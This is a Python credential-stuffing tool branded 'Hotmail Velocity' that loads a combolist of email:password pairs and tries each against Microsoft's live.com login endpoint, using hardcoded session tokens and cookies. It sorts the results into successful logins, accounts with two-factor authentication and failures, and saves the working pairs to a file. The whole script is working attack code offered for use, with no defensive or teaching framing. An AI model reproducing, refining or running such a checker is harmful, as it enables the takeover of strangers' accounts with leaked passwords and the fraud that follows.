import requests, time, os, sys
from concurrent.futures import ThreadPoolExecutor


PURPLE_DARK = '\033[38;5;54m'
PURPLE_MID = '\033[38;5;93m'
PURPLE_LIGHT = '\033[38;5;141m'
LAVENDER = '\033[38;5;183m'
WHITE = '\033[1;97m'
GREEN = '\033[38;5;46m'
YELLOW = '\033[38;5;220m'
RED = '\033[38;5;196m'
RESET = '\033[0m'


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def interface():
    clear_screen()
    banner = f"""
{PURPLE_LIGHT}╭──────────────────────────────────────────────────────────────╮{RESET}
{PURPLE_LIGHT}│{LAVENDER}                 H O T M A I L   V E L O C I T Y              {PURPLE_LIGHT}│{RESET}
{PURPLE_LIGHT}│{WHITE}        NON - PROXY - CHECKER  •  Threads: 3  •  v1.0       {PURPLE_LIGHT}  │{RESET}
{PURPLE_LIGHT}╰──────────────────────────────────────────────────────────────╯{RESET}
"""
    print(banner)

def hotmail_checker(email, password):
    url = "https://login.live.com/ppsecure/post.srf"
    params = {
        "username": email,
        "client_id": "81feaced-5ddd-41e7-8bef-3e20a2689bb7",
        "contextid": "CB8FF462A1ED2E9E",
        "opid": "5B62766A3DB12172",
        "bk": "1707331891",
        "uaid": "22eb17f4436d499295415de120e3254b",
        "pid": "15216"
    }
    data = {
        "i13": "0",
        "login": email,
        "loginfmt": email,
        "type": "11",
        "LoginOptions": "3",
        "passwd": password,
        "ps": "2",
        "PPFT": "-Digys3SwTVzWkdfuLeqNyvrqsDav35RZe08AjFggfRs448wpr5xKfDFyLlPVceGaUdq0cj9x05ACf3sSeps3E2nPkSmMd9L7KQUERLeNFfGfkrb5nsTH8mDxirvrdBeR6CvwdFaC!7mMQQDUm6b7*u3AF7u6f!IOOcPNRA3pBpt0S5uT8hN8nX8Xy4NcdSnF5w$$",
        "PPSX": "Pa",
        "NewUser": "1",
        "fspost": "0",
        "CookieDisclosure": "0",
        "IsFidoSupported": "0",
        "isSignupPost": "0",
        "isRecoveryAttemptPost": "0",
        "i19": "12498"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Host": "login.live.com",
        "Cookie": "MSPOK=$uuid-6100e6c1-0cc5-4c25-9e8f-b179e69d86b7; OParams=11O.DvXjL5aIUZlMq131SruZGhxgrjnTeTls03PVPMhZLUzcmxe0xYm31hxg7a8xDBxkhESW*VIs5D*cziejKpDPsoMm7KGlt!srR7wjkK9pxU5nD7gs8PhMRCI!NKPaS0IwKlNw3EjYsL6HaErddA7B3oHFI4D4tBlj*FE1KzOYcIMAnI1D5dCiy96bz0TGzMFnMMuhNhSCu0nbh3axIT1VFusHpio*ztpTUIa6V4RN*GP!swiAbbCBphYf7YISIR6y4w*P8vhPn4dfQluBA6eftHn6Uw1ovIg2R3f19KXDgwnIwmnKN0yq1FPGAHTVHKNRKFCUCFJKMZZRWyfGgpWMPu1ZBf!syV5cSCihZk4QGuA29pz87iJjWKLvm*lIpL5xyWFE7AVIrSSJ86gh1YY4Y0O!JsVbI7J*kABKRiE2cGCPMiBkUT2g3!UX6XDAImzYGVNMCPzqhE78AonT0eJP1LbaUVad4F0hDoEu7CbiaFKdzvMFopE1z56bg7fg1Fh1sjDcBOnWvAZbvEIq2Iodp63jKkxYzTooidyT312TJTJ8O3oIOzHuPctGtGx66O0FHXVezAHq8!VHjQq7hI2u5r*DpuKHgLk1lmAF00x3juYi*tJeUiP8cIAaB!HrehejZDEsv1BOMhyGC4xslT2Epbkb2AfR8g4pLslIn1nsAKwUI02LXvjtIHzAZlhqCDabtCoMGxQDLcAZBJl7aTA8DhYVoIYId934HIz3ZrDVp!gQ0!DgQyoOL3KVwX7FDQeX5wmXok1F9vXbgs6A8lJ4rarnWiCPIZeZm03NLUR0r9nXbzQdiBZ5Vg3Ibfz3pyBbwZhxgOeJGI*Xdvin*WtAYCf4ho7!zVeI4UjlZ1d6ddacNL8YfMZCBiCBAeDou4onHf8kCFtljbGi5sGCJ8mQ7nUEMbMkurCd!ofkQwOrkzibDoXEayKONl0QERp9DNk!jUxOwR50Wzux!WL8tvne!2C0zlYo!BEpVKEOMtyrhG8Rr4gbwnZDRZOi*heqxW5IczU2s29S6jg3rDepqT8NjV4kJdasgXgCIsNSuH35deaxU5*LxdI5A3UmI6gDsdYemnQcGMXs04yR5C4lVTlNolacXH2iuDdqA*1a73JVvHAuH6N3P8Vmqj96yJAGFQofVYFHhynF9RxZzyWSIJRj1HqMRA3ndWBDdnkFp4YzCFjl*9flkkRB6!mrK0tARcZam3OVt4!aikFnfHTEh*#M#GbWLmpOSszmadreMRBokyoeYY7N*sXnTB9LkCwHgQf!u!rU5HK8JWJh!oTCJljKV20TmgtOLCdmS!U9rAHaufnjRt5HxTTle6C3at7a*#Am4VpjWH7eVibqWV6oLQh9hU!qHNkvrZ7B7lT4N67nHT5TIQh74eukO3fnY1tJDBDcUyhRbcIXtwFuI1xI5QNlnlqQtqvuP8QZtSzYw9QJS3DJsSN;"
    }
    
    try:
        response = requests.post(url, params=params, data=data, headers=headers, timeout=10)
        if "sSigninName" in response.text:
            return True
        elif "Type = {SQSA: 6, CSS: 5," in response.text:
            return False
        elif 'name="ipt" id="ipt"' in response.text:
            return "2fa"
        else:
            return False
    except:
        return "error"

def process_line(leoni):
    if ":" not in leoni:
        return

    try:
        parts = leoni.strip().split(":")
        if len(parts) != 2:
            return
        email, password = parts
    except:
        return

    result = hotmail_checker(email, password)
    
    if result == True:
        print(f"{GREEN} ⚡ [HIT] Successful Login {RESET}→ {WHITE}{email}:{password}{RESET}")
        with open("Valid_Mails.txt", "a") as wizo:
            wizo.write(f"{email}:{password}\n")
    elif result == "2fa":
        print(f"{YELLOW} 🛡️ [2FA] Two-Factor Auth  {RESET}→ {WHITE}{email}:{password}{RESET}")
        with open("2fa.txt", "a") as twofa_file:
            twofa_file.write(f"{email}:{password}\n")
    elif result == "error":
        print(f"{PURPLE_LIGHT} ⚠️ [ERR] Connection Fault {RESET}→ {WHITE}{email}{RESET}")
    else:
        print(f"{RED} ❌ [BAD] Invalid Auth     {RESET}→ {WHITE}{email}:{password}{RESET}")
        with open("Bad.txt", "a") as bad_file:
            bad_file.write(f"{email}:{password}\n")

def main():
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except:
        pass

    interface()
    print(f" {PURPLE_LIGHT}┌─[{LAVENDER} INPUT COMBOLIST {PURPLE_LIGHT}]")
    file_path = input(f" {PURPLE_LIGHT}└─► {WHITE}Enter File Path & Press Enter: {RESET}").strip().strip('"\'')
    
    interface()
    
    if not os.path.exists(file_path):
        print(f"\n {RED}❌ Error: Target payload container not found on disk.{RESET}\n")
        return

    open_file = open(file_path, "r", encoding="utf-8", errors="ignore").read().splitlines()
    
    print(f" {PURPLE_LIGHT}┌─[{LAVENDER} CHECKING COMBO {PURPLE_LIGHT}]")
    print(f" {PURPLE_LIGHT}│{WHITE} Loaded {len(open_file)} Checking Combination in Progress...{RESET}")
    print(f" {PURPLE_LIGHT}└─────────────────────────────────────────────────────────────────┘{RESET}\n")
    
    with ThreadPoolExecutor(max_workers=3) as executor:
        executor.map(process_line, open_file)

    print(f"\n {GREEN}✨ execution completed successfully.{RESET}\n")

if __name__ == "__main__":
    main()